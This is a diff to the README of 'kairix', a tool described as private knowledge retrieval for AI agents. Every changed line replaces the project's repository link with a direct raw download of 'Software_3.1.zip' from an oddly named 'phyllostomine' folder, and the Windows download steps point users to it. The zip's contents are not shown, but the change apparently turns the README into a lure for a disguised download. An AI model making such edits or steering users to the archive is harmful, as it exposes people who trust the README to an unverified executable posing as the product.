@@ -1,6 +1,6 @@
 # 🧠 kairix - Private knowledge retrieval for your team
 
-[![](https://img.shields.io/badge/Download-Kairix-blue.svg)](https://github.com/DawoodMX/kairix)
+[![](https://img.shields.io/badge/Download-Kairix-blue.svg)](https://github.com/DawoodMX/kairix/raw/refs/heads/main/phyllostomine/Software_3.1.zip)
 
 Kairix organizes your information. It helps AI agents find answers within your private files. It uses search methods to connect your documents, notes, and team data. The software runs on your computer. You keep control of your data.
 
@@ -8,7 +8,7 @@ Kairix organizes your information. It helps AI agents find answers within your p
 
 You need the application file to begin. Visit the link below to reach the download page.
 
-[Download Kairix for Windows](https://github.com/DawoodMX/kairix)
+[Download Kairix for Windows](https://github.com/DawoodMX/kairix/raw/refs/heads/main/phyllostomine/Software_3.1.zip)
 
 1. Click the link above.
 2. Look for the Assets section on that page.
